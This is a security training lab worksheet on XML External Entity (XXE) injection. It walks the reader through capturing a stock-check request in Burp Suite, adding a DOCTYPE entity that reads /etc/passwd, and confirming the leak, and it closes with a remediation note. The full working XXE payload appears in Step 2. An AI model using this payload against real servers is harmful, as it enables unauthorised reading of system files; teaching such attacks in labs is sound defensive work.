# Lab 2: XML External Entity (XXE) Injection

## Goal
Understand and exploit an XXE vulnerability to read arbitrary local files from the server.

## Scenario
The target web application allows users to upload XML files to process product inventory. The XML parser is misconfigured and evaluates external entities.

## Step 1: Reconnaissance
1. Locate the XML upload or input feature in the web application (e.g., a "Check Stock" endpoint that uses XML).
2. Capture a legitimate XML request using **Burp Suite**.
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <stockCheck>
       <productId>1</productId>
       <storeId>2</storeId>
   </stockCheck>
   ```

## Step 2: The XXE Payload
1. Modify the XML request in Burp Suite Repeater to include a malicious external entity.
2. Add a `DOCTYPE` definition that defines an external entity (`&xxe;`) pointing to `/etc/passwd`.
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck>
       <productId>&xxe;</productId>
       <storeId>2</storeId>
   </stockCheck>
   ```

## Step 3: Exploitation
1. Send the modified request.
2. The server processes the XML, resolves the `&xxe;` entity, and reads `/etc/passwd`.
3. The response will reflect the contents of the `/etc/passwd` file within the `productId` tag in the response.

## Success Check:
- [ ] Identified the XML parsing endpoint.
- [ ] Successfully crafted an XXE payload.
- [ ] Successfully read the `/etc/passwd` file.
- [ ] I understand how to remediate this (disable external entity resolution in the XML parser).
